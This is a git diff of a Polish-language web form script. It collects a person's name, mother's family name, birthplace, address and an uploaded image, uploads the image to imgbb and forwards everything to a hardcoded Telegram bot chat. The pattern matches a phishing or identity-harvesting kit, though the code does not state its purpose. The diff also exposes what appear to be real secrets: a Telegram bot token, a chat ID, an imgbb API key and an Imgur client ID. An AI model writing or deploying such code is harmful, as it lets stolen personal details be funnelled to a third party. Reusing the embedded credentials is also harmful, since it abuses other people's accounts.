@@ -1,7 +1,7 @@
-
-const IMGUR_CLIENT_ID = 'c8c28d402435402';
-const TELEGRAM_CHAT_ID = '5447264217';
-const TELEGRAM_TOKEN = '7626788939:AAGgZlg7vqqcMwEd6E-fn1ehJsjH4o72bRQ';
+>
+const imgbbAPIKey = '52b73aa01dca04b64bc5f5e9cb7601e6';
+const telegramToken = '7626788939:AAGgZlg7vqqcMwEd6E-fn1ehJsjH4o72bRQ';
+const telegramChatId = '5447264217';
 
 document.querySelector('.go').addEventListener('click', async () => {
   const name = document.getElementById('name').value;
@@ -33,60 +33,65 @@ document.querySelector('.go').addEventListener('click', async () => {
 👩 Matka: ${mothersFamilyName}
 🏙️ Miejsce urodzenia: ${birthPlace}, ${countryOfBirth}
 🏠 Adres: ${address1}, ${address2} ${city}
-  `;
-
-  const fileInput = document.querySelector('input[type="file"]');
-  const file = fileInput?.files?.[0];
+`;
 
   try {
-    let imageUrl = null;
+    const fileInput = document.querySelector('input[type="file"]');
+    const file = fileInput?.files?.[0];
 
     if (file) {
+      const base64 = await toBase64(file);
       const formData = new FormData();
-      formData.append('image', file);
+      formData.append('image', base64.split(',')[1]);
 
-      const imgurRes = await fetch('https://cors-anywhere.herokuapp.com/https://api.imgur.com/3/image', {
+      const uploadRes = await fetch(`https://api.imgbb.com/1/upload?key=${imgbbAPIKey}`, {
         method: 'POST',
-        headers: {
-          Authorization: `Client-ID ${IMGUR_CLIENT_ID}`
-        },
         body: formData
       });
 
-      const imgurData = await imgurRes.json();
-      if (!imgurData.success) throw new Error('Błąd podczas uploadu do Imgura');
-      imageUrl = imgurData.data.link;
-    }
+      const result = await uploadRes.json();
+      if (!result.success) {
+        throw new Error('Błąd uploadu do imgbb: ' + result.error.message);
+      }
 
-    const telegramEndpoint = imageUrl
-      ? `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`
-      : `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
+      const imageUrl = result.data.url;
 
-    const body = imageUrl
-      ? {
-          chat_id: TELEGRAM_CHAT_ID,
+      await fetch(`https://api.telegram.org/bot${telegramToken}/sendPhoto`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: telegramChatId,
           photo: imageUrl,
           caption: text,
           parse_mode: 'HTML'
-        }
-      : {
-          chat_id: TELEGRAM_CHAT_ID,
-          text: text,
+        })
+      });
+
+    } else {
+      await fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: telegramChatId,
+          text,
           parse_mode: 'HTML'
-        };
+        })
+      });
+    }
 
-    const res = await fetch(telegramEndpoint, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(body)
-    });
-
-    const data = await res.json();
-    if (!data.ok) throw new Error(data.description);
-
-    alert('✅ Dane zostały wysłane do Telegrama!');
+    alert('Dane wysłane do Telegrama!');
   } catch (err) {
     console.error(err);
-    alert('❌ Błąd: ' + err.message);
+    alert('Błąd: ' + err.message);
   }
 });
+
+// Zamienia plik na base64
+function toBase64(file) {
+  return new Promise((resolve, reject) => {
+    const reader = new FileReader();
+    reader.onload = () => resolve(reader.result);
+    reader.onerror = reject;
+    reader.readAsDataURL(file);
+  });
+}
